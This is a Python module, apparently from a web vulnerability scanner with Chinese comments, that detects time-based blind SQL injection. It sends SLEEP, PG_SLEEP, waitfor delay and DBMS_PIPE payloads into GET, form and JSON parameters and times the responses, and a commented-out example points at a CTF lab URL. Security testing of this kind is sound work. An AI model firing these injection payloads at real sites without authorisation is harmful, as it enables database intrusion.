import json

import requests

from lib.core.common import random_num, get_replaced_url, vuln_print
from urllib import parse
import time

from lib.settings import vuln_level


class SQLITimeCheck:
    def __init__(self):
        self.sleep_str = "5"
        self.num = random_num(4)
        self.sql_time_payloads = {
            "MySQL": (
                " AND SLEEP({})".format(self.sleep_str),
                " AND SLEEP({})--+".format(self.sleep_str),
                "' AND SLEEP({})".format(self.sleep_str),
                "' AND SLEEP({})--+".format(self.sleep_str),
                "' AND SLEEP({}) AND '{}'='{}".format(self.sleep_str, self.num, self.num),
                '''" AND SLEEP({}) AND "{}"="{}'''.format(self.sleep_str, self.num, self.num)),
            "Postgresql": (
                " AND {}=(SELECT {} FROM PG_SLEEP({}))".format(self.num, self.num, self.sleep_str),
                " AND {}=(SELECT {} FROM PG_SLEEP({}))--+".format(self.num, self.num, self.sleep_str),
            ),
            "Microsoft SQL Server or Sybase": (
                " waitfor delay '0:0:{}'--+".format(self.sleep_str),
                "' waitfor delay '0:0:{}'--+".format(self.sleep_str),
                '''" waitfor delay '0:0:{}'--+'''.format(self.sleep_str)),
            "Oracle": (
                " and 1= dbms_pipe.receive_message('RDS', {})--+".format(self.sleep_str),
                "' and 1= dbms_pipe.receive_message('RDS', {})--+".format(self.sleep_str),
                '''" and 1= dbms_pipe.receive_message('RDS', {})--+'''.format(self.sleep_str),
                " AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})".format(self.sleep_str),
                " AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})--+".format(
                    self.sleep_str),
            )
        }

    def get_time_payloads(self):
        payloads = []
        for payload in self.sql_time_payloads["MySQL"]:
            payloads.append(payload)
        for payload in self.sql_time_payloads["Postgresql"]:
            payloads.append(payload)
        for payload in self.sql_time_payloads["Microsoft SQL Server or Sybase"]:
            payloads.append(payload)
        for payload in self.sql_time_payloads["Oracle"]:
            payloads.append(payload)
        return payloads

    def max_time(self, url):
        times = []
        for i in range(1, 21):
            start_time = time.time()
            try:
                requests.get(url)
            except BaseException:
                pass
            end_time = time.time()
            times.append(end_time - start_time)
        # mac m1不支持numpy库进行标准差计算，这里用计算两次请求时间之间的差值作为粗略的标准差
        return max(times) + abs(times[0] - times[1])

    def check_get_time_sqli(self, request):
        url = request.url
        payloads = self.get_time_payloads()
        dict = parse.parse_qs(parse.urlparse(url).query)
        for key, value in dict.items():
            if len(value) == 1:
                for payload in payloads:
                    url1 = get_replaced_url(
                        url, dict[key][0], dict[key][0] + payload)
                    start_time = time.time()
                    try:
                        requests.get(url1, headers=request.headers)
                    except BaseException:
                        pass
                    end_time = time.time()
                    payload_time = end_time - start_time
                    # print("payload耗时："+str(end_time-start_time))
                    if payload_time > 5:
                        max_common_time = self.max_time(url)
                        if payload_time > max_common_time:
                            start_time = time.time()
                            try:
                                res_code = requests.get(
                                    url1, headers=request.headers, allow_redirects=False).status_code
                                if res_code == 302:
                                    # print(url1+" 302不检测")
                                    break
                            except:
                                pass
                            end_time = time.time()
                            recheck_payload_time = end_time - start_time
                            if recheck_payload_time > max_common_time:
                                print("存在sql时间盲注，payload：" + url1)
                                print(
                                    "第一次payload耗时：" +
                                    str(payload_time) +
                                    ",20次请求平均耗时+标准差：" +
                                    str(max_common_time) +
                                    ",再次payload耗时：" +
                                    str(recheck_payload_time))
                                vuln_print(
                                    url1, "sqli", vuln_level["sqli"], request.method)
                                break

    def check_post_urlencode_sqli(self, request):
        url = request.url
        body = request.get_text()
        payloads = self.get_time_payloads()
        mid_url = "https://www.baidu.com?" + body
        dict = parse.parse_qs(parse.urlparse(mid_url).query)
        for key, value in dict.items():
            if len(value) == 1:
                for payload in payloads:
                    dict[key][0] = dict[key][0] + payload
                    start_time = time.time()
                    try:
                        requests.post(url, data=dict, headers=request.headers)
                    except BaseException:
                        pass
                    end_time = time.time()
                    payload_time = end_time - start_time
                    # print("payload耗时：" + str(end_time - start_time))
                    if payload_time > 5:
                        max_common_time = self.max_time(url)
                        if payload_time > max_common_time:
                            start_time = time.time()
                            try:
                                requests.post(
                                    url, data=dict, headers=request.headers)
                            except BaseException:
                                pass
                            end_time = time.time()
                            recheck_payload_time = end_time - start_time
                            if recheck_payload_time > max_common_time:
                                print(
                                    "存在sql时间盲注，payload：" + url + "body：" + str(dict))
                                print(
                                    "第一次payload耗时：" +
                                    str(payload_time) +
                                    ",20次请求平均耗时+标准差：" +
                                    str(max_common_time) +
                                    ",再次payload耗时：" +
                                    str(recheck_payload_time))
                                vuln_print(
                                    url, "sqli", vuln_level["sqli"], request.method, body)
                                break

    def check_post_json_sqli(self, request):
        url = request.url
        body = request.get_text()
        payloads = self.get_time_payloads()
        dict = json.loads(body)
        for key, value in dict.items():
            if type(value).__name__ == "str":
                for payload in payloads:
                    dict[key] = dict[key] + payload
                    start_time = time.time()
                    try:
                        requests.post(url, data=dict, headers=request.headers)
                    except BaseException:
                        pass
                    end_time = time.time()
                    payload_time = end_time - start_time
                    # print("payload耗时：" + str(end_time - start_time))
                    if payload_time > 5:
                        max_common_time = self.max_time(url)
                        if payload_time > max_common_time:
                            start_time = time.time()
                            try:
                                requests.post(
                                    url, data=dict, headers=request.headers)
                            except BaseException:
                                pass
                            end_time = time.time()
                            recheck_payload_time = end_time - start_time
                            if recheck_payload_time > max_common_time:
                                print(
                                    "存在sql时间盲注，payload：" + url + "body：" + str(dict))
                                print(
                                    "第一次payload耗时：" +
                                    str(payload_time) +
                                    ",20次请求平均耗时+标准差：" +
                                    str(max_common_time) +
                                    ",再次payload耗时：" +
                                    str(recheck_payload_time))
                                vuln_print(
                                    url, "sqli", vuln_level["sqli"], request.method, body)
                                break

#
#
# if __name__ == "__main__":
#     sqli = SQLI_Time()
#     sqli.check_get_time_sqli("http://1f89f3bd-9232-449e-bdeb-94cf15d3f1af.node4.buuoj.cn/Less-2/?id=1")
